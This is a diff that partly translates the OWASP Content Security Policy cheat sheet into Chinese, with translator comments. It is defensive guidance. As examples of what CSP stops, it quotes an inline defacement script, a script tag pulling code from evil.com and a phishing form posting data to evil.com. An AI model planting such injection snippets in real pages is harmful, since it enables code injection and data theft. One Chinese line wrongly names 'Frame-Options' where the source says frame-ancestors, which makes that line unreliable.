@@ -1,40 +1,40 @@
-# Content Security Policy Cheat Sheet
+# 内容安全策略
 
-## Introduction
+## 介绍
 
-This article brings forth a way to integrate the __defense in depth__ concept to the client-side of web applications. By injecting the Content-Security-Policy (CSP) headers from the server, the browser is aware and capable of protecting the user from dynamic calls that will load content into the page currently being visited.
+本文提出了一种将**深度防御**概念集成到web应用程序客户端的方法。通过从服务器注入内容安全策略（CSP）头，浏览器可以感知并能够保护用户免受当前所访问的页面，加载内容时的动态调用带来的风险。([D] 可以理解为动态执行JS，DOM变更时的限制策略)
 
-## Context
+## 背景
 
-The increase in XSS (Cross-Site Scripting), clickjacking, and cross-site leak vulnerabilities demands a more __defense in depth__ security approach.
+XSS（跨站点脚本）、点击劫持和跨站泄漏等漏洞日益增长进而需要**纵深防御**的安全方法。
 
-### Defense against XSS
+### 防御XSS
 
-CSP defends against XSS attacks in the following ways:
+CSP通过以下方式防御XSS攻击：
 
-#### 1. Restricting Inline Scripts
+#### 1. 限制内联脚本
 
-By preventing the page from executing inline scripts, attacks like injecting
+通过阻止页面执行内联脚本，可以防止注入
 
 ```html
 <script>document.body.innerHTML='defaced'</script>
 ```
 
- will not work.
+上述代码则不会执行
 
-#### 2. Restricting Remote Scripts
+#### 2. 限制远程脚本
 
-By preventing the page from loading scripts from arbitrary servers, attacks like injecting
+通过防止页面从任意服务器加载脚本
 
 ```html
 <script src="https://evil.com/hacked.js"></script>
 ```
 
-will not work.
+上述代码则不会执行
 
-#### 3. Restricting Unsafe JavaScript
+#### 3. 限制不安全的JavaScript
 
-By preventing the page from executing text-to-JavaScript functions like `eval`, the website will be safe from vulnerabilities like the this:
+通过防止页面执行文本到JavaScript的功能，如`eval`，网站将不会受到以下漏洞的影响：
 
 ```js
 // A Simple Calculator
@@ -44,9 +44,9 @@ var sum = eval(`${op1} + ${op2}`);
 console.log(`The sum is: ${sum}`);
 ```
 
-#### 4. Restricting Form submissions
+#### 4. 限制表格提交
 
-By restricting where HTML forms on your website can submit their data, injecting phishing forms won't work either.
+通过限制网站上HTML表单提交数据的位置，注入网络钓鱼表单也不会起作用。 
 
 ```html
 <form method="POST" action="https://evil.com/collect">
@@ -61,77 +61,81 @@ By restricting where HTML forms on your website can submit their data, injecting
 </form>
 ```
 
-#### 5. Restricting Objects
+#### 5.  限制对象 
 
-And by restricting the HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) tag, it also won't be possible for an attacker to inject malicious flash/Java/other legacy executables on the page.
+通过限制HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object)标签，攻击者也不可能在页面上注入恶意flash/Java/其他遗留可执行文件。
 
-### Defense against framing attacks
+### 防御frame攻击
 
-Attacks like clickjacking and some variants of browser side-channel attacks (xs-leaks) require a malicious website to load the target website in a frame.
+点击劫持等攻击和浏览器端通道攻击（xs泄漏）的某些变体需要恶意网站在frame中加载目标网站。
 
-Historically the `X-Frame-Options` header has been used for this, but it has been obsoleted by the `frame-ancestors` CSP directive.
+历史上，`X-Frame-Options`头一直用于此目的，但它已被`Frame-Options`CSP指令淘汰。
 
-## Defense in Depth
+## 纵深防御
 
-A strong CSP provides an effective second layer of protection against various types of vulnerabilities, especially XSS. Although CSP doesn't prevent web applications from *containing* vulnerabilities, it can make those vulnerabilities significantly more difficult for an attacker to exploit.
+强大的CSP针对各种类型漏洞提供了有效的第二层保护，尤其是XSS。虽然CSP不能阻止web应用程序*包含*漏洞，但它会使攻击者更难利用这些漏洞。 
 
-Even on a fully static website, which does not accept any user input, a CSP can be used to enforce the use of [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity). This can help prevent malicious code from being loaded on the website if one of the third-party sites hosting JavaScript files (such as analytics scripts) is compromised.
+即使在不接受任何用户输入的完全静态网站上，也可以使用CSP强制使用[子资源完整性（SRI）](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)。如果托管JavaScript文件（如网站访问分析脚本）的某个第三方网站受到破坏，这有助于防止在网站上加载恶意代码。 ([D] 早在15年学习HTML时，非常流行jquery，当时就思考过，托管jquery的服务器被拿下，岂不是全世界大量网站都受到影响，可以看到CSP给出了解决方法)
 
-## CSP is not a substitute for secure development
+## CSP不能替代安全开发
 
-CSP **should not** be relied upon as the only defensive mechanism against XSS. You must still follow good development practices such as the ones described in [Cross-Site Scripting Prevention Cheat Sheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md), and then deploy CSP on top of that as a bonus security layer.
+CSP**不应**被视为针对XSS的唯一防御机制。您仍然必须遵循良好的开发实践，例如[防范XSS](./Cross_Site_Scripting_Prevention_Cheat_Sheet.md)中描述的实践，然后在其上部署CSP作为额外的安全层。
 
-## Policy Delivery
+## 策略传递
 
-You can deliver a Content Security Policy to your website in three ways.
+ 您可以通过三种方式向网站传递内容安全策略。 
 
-### 1. Content-Security-Policy Header
+### 1. Content-Security-Policy 头
 
-Send a Content-Security-Policy HTTP response header from your web server.
+从web服务器发送内容安全策略HTTP响应头。
 
 ```text
 Content-Security-Policy: ...
 ```
 
-Using a header is the preferred way and supports the full CSP feature set. Send it in all HTTP responses, not just the index page.
+使用头是首选方式，支持完整的CSP功能集。将其发送到所有HTTP响应中，而不仅仅是索引页。
 
-### 2. Content-Security-Policy-Report-Only Header
+### 2. Content-Security-Policy-Report-Only 头
 
-Using the `Content-Security-Policy-Report-Only`, you can deliver a CSP that doesn't get enforced.
+通过使用 `Content-Security-Policy-Report-Only`，您可以交付一个非强制执行的CSP。
 
 ```text
 Content-Security-Policy-Report-Only: ...
 ```
 
-Still, violation reports are printed to the console and delivered to a violation endpoint if the `report-to` and `report-uri` directives are used.
+尽管如此，如果使用了`report to`和`report uri`指令，违反策略的上报事件仍会打印到控制台并传递到违反策略的端点。
 
-Browsers fully support the ability of a site to use both `Content-Security-Policy` and `Content-Security-Policy-Report-Only` together, without any issues. This pattern can be used for example to run a strict `Report-Only` policy (to get many violation reports), while having a looser enforced policy (to avoid breaking legitimate site functionality).
 
-### 3. Content-Security-Policy Meta Tag
+浏览器完全支持网站同时使用 `Content-Security-Policy` 和`Content-Security-Policy-Report-Only` 的能力，没有任何问题。例如，可以使用这种模式来运行严格的 `Report-Only` 策略（会发现存在许多违反策略的上报事件），同时使用更宽松的强制策略（以避免破坏合法的站点功能）。
 
-Sometimes you cannot use the Content-Security-Policy header if you are, e.g., Deploying your HTML files in a CDN where the headers are out of your control.
+### 3. Content-Security-Policy 元标签
 
-In this case, you can still use CSP by specifying a `http-equiv` meta tag in the HTML markup, like so:
+有时，如果您正在（例如）将HTML文件部署到一个CDN中，而头文件不受您的控制，则无法使用内容安全策略头。
+
+
+在这种情况下，您仍然可以通过在HTML标记中指定`http equiv`元标签来使用CSP，如下所示：
 
 ```html
 <meta http-equiv="Content-Security-Policy" content="...">
 ```
 
-Almost everything is still supported, including full XSS defenses. However, you will not be able to use [framing protections](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), [sandboxing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), or a [CSP violation logging endpoint](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).
+几乎所有东西都仍然受到支持，包括完整的XSS防御。但是，您将无法使用[frame防御](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors),，[沙箱](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)，[日志记录违反CSP策略的端点](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
 
 ### HTTP Headers
 
-The following are headers for CSP.
+以下头用于CSP.
 
-- `Content-Security-Policy` : W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+
-- `Content-Security-Policy-Report-Only` : W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking ("fail open") and a report is sent to the URL designated by the `report-uri` (or newer `report-to`) directive. This is often used as a precursor to utilizing CSP in blocking mode ("fail closed")
-- `DO NOT` use X-Content-Security-Policy or X-WebKit-CSP. Their implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy.
+- `Content-Security-Policy` : W3C规范标准头. 由Firefox 23+、Chrome 25+和Opera 19支持+
+- `Content-Security-Policy-Report-Only` : W3C规范标准头.由Firefox 23+、Chrome 25+和Opera 19+支持，策略为非阻塞（“故障开放”），并将报告发送到“report-uri”（或更新的“report-to”）指令指定的URL。这通常被用作在阻塞模式下利用CSP（“故障关闭”）的前兆
+- `请勿` 使用X-Content-Security-Policy或X-WebKit-CSP。它们的实现已经过时（自Firefox 23、Chrome 25以来）、有约束、不一致，而且存在令人难以置信的缺陷。
 
-## CSP Directives
+## CSP指令
 
-Multiple types of directives exist that allow the developer to control the flow of the policies granularly.
+存在多种类型的指令，允许开发人员精确地控制策略流。
 
-### Fetch Directives
+### Fetch 指令
+
+Fetch指令告诉浏览器要信任的位置，并从中加载资源。
 
 Fetch directives tell the browser the locations to trust and load resources from.
 
@@ -153,7 +157,7 @@ Most fetch directives have a certain [fallback list specified in w3](https://www
     - `style-src-attr` controls styles attributes.
 - `default-src` is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of `default-src`.
 
-### Document Directives
+### Document 指令
 
 Document directives instruct the browser about the properties of the document to which the policies will apply to.
 
@@ -167,7 +171,7 @@ Document directives instruct the browser about the properties of the document to
     - Not specifying a value for the directive activates all of the sandbox restrictions. `Content-Security-Policy: sandbox;`
     - [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)
 
-### Navigation Directives
+### Navigation 指令
 
 Navigation directives instruct the browser about the locations that the document can navigate to.
 
@@ -178,7 +182,7 @@ Navigation directives instruct the browser about the locations that the document
     - This directive doesn't fallback to `default-src` directive.
     - `X-Frame-Options` is rendered obsolete by this directive and is ignored by the user agents.
 
-### Reporting Directives
+### Reporting 指令
 
 Reporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives.
 
@@ -189,7 +193,7 @@ Reporting directives deliver violations of prevented behaviors to specified loca
 
 In order to ensure backward compatibility, use the 2 directives in conjunction. Whenever a browser supports `report-to`, it will ignore `report-uri`. Otherwise, `report-uri` will be used.
 
-### Special Directive Sources
+### 特别指令来源
 
 | Value            | Description                                                                 |
 |------------------|-----------------------------------------------------------------------------|
@@ -217,7 +221,7 @@ To get the hash, look at Google Chrome developer tools for violations like this:
 
 You can also use this [hash generator](https://report-uri.com/home/hash). This is a great [example](https://csp.withgoogle.com/docs/faq.html#static-content) of using hashes.
 
-#### Note
+#### 注意
 
 Using hashes is generally not a very good approach. If you change *anything* inside the script tag (even whitespace) by, e.g., formatting your code, the hash will be different, and the script won't render.
 
@@ -238,7 +242,7 @@ You would then pass this nonce to your view (using nonces requires a non-static 
 </script>
 ```
 
-#### Warning
+#### 警告
 
 **Don't** create a middleware that replaces all script tags with "script nonce=..." because attacker-injected scripts will then get the nonces as well. You need an actual HTML templating engine to use nonces.
 
@@ -250,7 +254,7 @@ If the script block is creating additional DOM elements and executing JS inside 
 
 Note that `strict-dynamic` is a CSP level 3 feature and not very widely supported yet. For more details, check out [strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).
 
-## CSP Sample Policies
+## CSP策略示例
 
 ### Basic CSP Policy
 
@@ -347,7 +351,7 @@ This should be replaced by `addEventListener` calls:
 document.getElementById("button1").addEventListener('click', doSomething);
 ```
 
-## References
+## 引用
 
 - [Strict CSP](https://web.dev/strict-csp)
 - [CSP Level 3 W3C](https://www.w3.org/TR/CSP3/)
